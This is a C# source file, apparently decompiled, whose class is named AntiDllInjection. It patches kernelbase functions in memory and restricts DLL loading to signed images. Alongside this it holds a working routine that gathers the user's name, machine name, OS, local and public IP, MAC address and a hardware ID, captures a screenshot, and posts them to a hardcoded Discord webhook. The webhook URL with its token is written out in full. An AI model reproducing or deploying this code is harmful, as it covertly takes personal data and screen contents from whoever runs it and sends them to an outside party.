using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApp2;

internal class AntiDllInjection
{
	public struct PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY
	{
		public uint MicrosoftSignedOnly;

		public uint StoreSignedOnly;

		public uint MitigationOptIn;

		public uint ReservedFlags;
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string lib);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr moduleHandle, string function);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr procHandle, IntPtr baseAddress, byte[] buffer, uint size, int numOfBytes);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool SetProcessMitigationPolicy(int policy, ref PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY lpBuffer, int size);

	[DllImport("kernel32.dll")]
	private static extern bool IsDebuggerPresent();

	public static string PatchFunction(string functionName)
	{
		try
		{
			IntPtr moduleHandle = GetModuleHandle("kernelbase.dll");
			IntPtr procAddress = GetProcAddress(moduleHandle, functionName);
			byte[] array = new byte[3] { 194, 4, 0 };
			return WriteProcessMemory(Process.GetCurrentProcess().Handle, procAddress, array, (uint)array.Length, 0) ? "Success" : "Failed";
		}
		catch
		{
			return "Exception";
		}
	}

	public static string EnableBinaryImageSignatureMitigation()
	{
		try
		{
			PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY lpBuffer = new PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY
			{
				MicrosoftSignedOnly = 1u
			};
			return SetProcessMitigationPolicy(8, ref lpBuffer, Marshal.SizeOf(typeof(PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY))) ? "Success" : "Failed";
		}
		catch
		{
			return "Exception";
		}
	}

	public static async void CheckAndReportDebugger()
	{
	}

	private static async Task SendPcInfoWithScreenshotAsync()
	{
		string pCInfo = GetPCInfo();
		string filePath = CaptureScreenshot();
		await SendToWebhook(pCInfo, filePath);
	}

	private static string CaptureScreenshot()
	{
		string text = Path.Combine(Path.GetTempPath(), "screenshot.jpg");
		using Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
		using (Graphics graphics = Graphics.FromImage(bitmap))
		{
			graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
		}
		bitmap.Save(text, ImageFormat.Jpeg);
		return text;
	}

	private static string GetLocalIP()
	{
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		IPAddress[] addressList = hostEntry.AddressList;
		foreach (IPAddress iPAddress in addressList)
		{
			if (iPAddress.AddressFamily == AddressFamily.InterNetwork)
			{
				return iPAddress.ToString();
			}
		}
		return "No IPv4";
	}

	private static string GetPublicIP()
	{
		try
		{
			using WebClient webClient = new WebClient();
			return webClient.DownloadString("https://api.ipify.org");
		}
		catch
		{
			return "N/A";
		}
	}

	private static string GetMACAddress()
	{
		return NetworkInterface.GetAllNetworkInterfaces().FirstOrDefault((NetworkInterface n) => n.OperationalStatus == OperationalStatus.Up && n.NetworkInterfaceType != NetworkInterfaceType.Loopback)?.GetPhysicalAddress().ToString() ?? "N/A";
	}

	private static string GetHWID()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.Append(Environment.UserName);
		stringBuilder.Append(Environment.MachineName);
		stringBuilder.Append(Environment.OSVersion.VersionString);
		stringBuilder.Append(GetLocalIP());
		stringBuilder.Append(GetPublicIP());
		stringBuilder.Append(GetMACAddress());
		return Convert.ToBase64String(Encoding.UTF8.GetBytes(stringBuilder.ToString()));
	}

	private static string GetPCInfo()
	{
		return "\ud83d\udda5 Username: " + Environment.UserName + "\n\ud83d\udcbb Machine: " + Environment.MachineName + "\n" + $"\ud83e\udde0 OS: {Environment.OSVersion}\n" + "\ud83d\udd10 HWID: ||" + GetHWID() + "||\n\ud83d\udce1 Local IP: ||" + GetLocalIP() + "||\n\ud83c\udf0d Public IP: ||" + GetPublicIP() + "||\n\ud83d\udd0c MAC Address: ||" + GetMACAddress() + "||\n" + $"\ud83d\udcc5 Time: {DateTime.Now}";
	}

	private static async Task SendToWebhook(string message, string filePath)
	{
		try
		{
			using HttpClient client = new HttpClient();
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			multipartFormDataContent.Add(new StringContent(message), "content");
			if (!string.IsNullOrEmpty(filePath) && File.Exists(filePath))
			{
				byte[] content = File.ReadAllBytes(filePath);
				multipartFormDataContent.Add(new ByteArrayContent(content), "file", "screenshot.jpg");
			}
			string requestUri = "https://discord.com/api/webhooks/1556098854384832583/_lXADyM3wO2BZXG6edrnXReoK_JMVXbt8Fw_q1Eg44R_oxWVaGGxmkkafX_B36prxAU3";
			await client.PostAsync(requestUri, multipartFormDataContent);
		}
		catch (Exception ex)
		{
			MessageBox.Show("Webhook failed: " + ex.Message);
		}
	}
}
